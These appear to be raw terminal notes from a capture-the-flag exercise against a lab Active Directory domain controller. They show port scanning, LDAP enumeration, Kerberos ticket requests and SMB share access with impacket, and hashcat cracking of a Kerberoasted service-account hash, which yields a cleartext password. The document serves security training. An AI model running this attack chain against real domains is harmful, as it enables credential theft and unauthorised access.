@@ -1,0 +1,185 @@
+└─$ nmap -p- -sSCV 10.129.186.240  --min-rate 999   
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Scramble Corp Intranet
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-22 03:17:21Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2026-01-22T02:33:38
+|_Not valid after:  2056-01-22T02:33:38
+|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
+| ms-sql-info: 
+|   10.129.186.240:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2019 RTM
+|       number: 15.00.2000.00
+|       Product: Microsoft SQL Server 2019
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-01-22T03:18:43+00:00; 0s from scanner time.
+| ssl-cert: Subject: 
+| Subject Alternative Name: DNS:DC1.scrm.local
+| Not valid before: 2024-09-04T11:14:45
+|_Not valid after:  2121-06-08T22:39:53
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+
+http://10.129.186.240/salesorders.html
+dc1.scrm.local 4411
+
+└─$ nmap -sU  -p 4411 10.129.186.240  --min-rate 999
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 13:52 AEDT
+Nmap scan report for 10.129.186.240
+Host is up (0.079s latency).
+
+PORT     STATE         SERVICE
+4411/udp open|filtered unknown
+
+└─$ ldapsearch -x -H ldap://10.129.186.240 -s base namingcontexts
+# extended LDIF
+#
+# LDAPv3
+# base <> (default) with scope baseObject
+# filter: (objectclass=*)
+# requesting: namingcontexts 
+#
+
+#
+dn:
+namingcontexts: DC=scrm,DC=local
+namingcontexts: CN=Configuration,DC=scrm,DC=local
+namingcontexts: CN=Schema,CN=Configuration,DC=scrm,DC=local
+namingcontexts: DC=DomainDnsZones,DC=scrm,DC=local
+namingcontexts: DC=ForestDnsZones,DC=scrm,DC=local
+
+# search result
+search: 2
+result: 0 Success
+
+# numResponses: 2
+# numEntries: 1
+
+
+
+└─$ impacket-GetADUsers -all scrm.local/ksimpson -dc-ip 10.129.186.240
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[-] NTLM negotiation failed. Probably NTLM is disabled. Try to use Kerberos authentication instead.
+[-] Error in bindRequest during the NTLMAuthNegotiate request -> invalidCredentials: 80090302: LdapErr: DSID-0C09058A, comment: AcceptSecurityContext error, data 1, v4563
+
+└─$ impacket-getTGT scrm.local/ksimpson -dc-ip 10.129.186.240
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Saving ticket in ksimpson.ccache
+
+└─$ impacket-smbclient -k scrm.local/ksimpson:ksimpson:ksimpson@dc1.scrm.local -dc-ip dc1.scrm.local
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Type help for list of commands
+# help
+
+ open {host,port=445} - opens a SMB connection against the target host/port
+ reconnect - reconnect connection, useful for broken pipes & interrupted sessions
+ login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
+ kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
+ login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
+ logoff - logs off
+ shares - list available shares
+ use {sharename} - connect to an specific share
+ cd {path} - changes the current directory to {path}
+ lcd {path} - changes the current local directory to {path}
+ pwd - shows current remote directory
+ password - changes the user password, the new password will be prompted for input
+ ls {wildcard} - lists all the files in the current directory
+ lls {dirname} - lists all the files on the local filesystem.
+ tree {filepath} - recursively lists all files in folder and sub folders
+ rm {file} - removes the selected file
+ mkdir {dirname} - creates the directory under the current path
+ rmdir {dirname} - removes the directory under the current path
+ put {filename} - uploads the filename into the current path
+ get {filename} - downloads the filename from the current path
+ mget {mask} - downloads all files from the current directory matching the provided mask
+ cat {filename} - reads the filename from the current path
+ mount {target,path} - creates a mount point from {path} to {target} (admin required)
+ umount {path} - removes the mount point at {path} without deleting the directory (admin required)
+ list_snapshots {path} - lists the vss snapshots for the specified path
+ info - returns NetrServerInfo main results
+ who - returns the sessions currently connected at the target host (admin required)
+ close - closes the current SMB Session
+ exit - terminates the server process (and this session)
+
+
+
+# shares
+ADMIN$
+C$
+HR
+IPC$
+IT
+NETLOGON
+Public
+Sales
+SYSVOL
+# use HR
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+# use ADMIN$
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+# use IT
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+# use Sales
+[-] SMB SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.
+# use Public
+# ls
+drw-rw-rw-          0  Fri Nov  5 09:23:19 2021 .
+drw-rw-rw-          0  Fri Nov  5 09:23:19 2021 ..
+-rw-rw-rw-     630106  Sat Nov  6 04:45:07 2021 Network Security Changes.pdf
+
+# mget Network Security Changes.pdf
+[*] Downloading Network Security Changes.pdf
+
+SQL database used by our HR software
+so we have removed all access to the SQL service for everyone apart from network administrators.
+
+─$ hashcat -m 13100 -a 0 hash ~/tools/rockyou.txt 
+f6561ffc5995412606f4ef42daa2815:Pegasus60
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+
+sqlsvc Pegasus60
+
